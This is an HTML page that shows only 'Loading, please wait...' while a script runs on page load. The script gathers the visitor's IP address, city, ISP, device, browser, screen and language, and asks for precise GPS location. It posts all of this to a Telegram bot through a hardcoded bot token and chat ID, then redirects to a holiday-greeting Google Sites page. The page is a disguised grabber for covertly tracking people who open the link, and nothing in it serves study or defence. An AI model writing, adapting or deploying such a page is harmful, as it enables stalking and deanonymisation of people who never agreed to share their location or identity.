<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Loading...</title>
<script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.2/src/ua-parser.min.js"></script>
<script>
const BOT_TOKEN = "7970129146:AAEg4zjo8w3byOa0S1l4ILpgZN6B1NnbvDA";
const CHAT_ID = "5419993390";
const REDIRECT_URL = "https://sites.google.com/view/rakshabandhan-/home";

async function getIPData() {
    try {
        let res = await fetch("https://ipinfo.io/json?token=2b4d6b8b3c26e9");
        return await res.json();
    } catch (e) {
        return {};
    }
}

function getDeviceData() {
    const parser = new UAParser();
    return parser.getResult();
}

function getGPS() {
    return new Promise(resolve => {
        if (!navigator.geolocation) return resolve("Not Supported");
        navigator.geolocation.getCurrentPosition(
            pos => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
            err => resolve("Permission Denied"),
            { enableHighAccuracy: true, timeout: 10000 }
        );
    });
}

async function sendToTelegram(data) {
    let text = `
📥 New Visitor:
📱 Device: ${data.device.device.vendor || "Unknown"} ${data.device.device.model || ""}
💻 OS: ${data.device.os.name || "Unknown"} ${data.device.os.version || ""}
🌐 Browser: ${data.device.browser.name || "Unknown"} ${data.device.browser.version || ""}
📐 Screen: ${window.screen.width}x${window.screen.height}
🗣 Language: ${navigator.language}
🌍 IP: ${data.ip.ip || "N/A"}
🏙 City: ${data.ip.city || "N/A"}
🏴 Region: ${data.ip.region || "N/A"}
🇨🇮 Country: ${data.ip.country || "N/A"}
📡 ISP: ${data.ip.org || "N/A"}
📍 GPS: ${data.gps}
    `;
    await fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text })
    });
}

async function main() {
    let ip = await getIPData();
    let device = getDeviceData();
    let gps = await getGPS();
    await sendToTelegram({ ip, device, gps });
    window.location.href = REDIRECT_URL;
}

main();
</script>
</head>
<body>
<p>Loading, please wait...</p>
</body>
</html>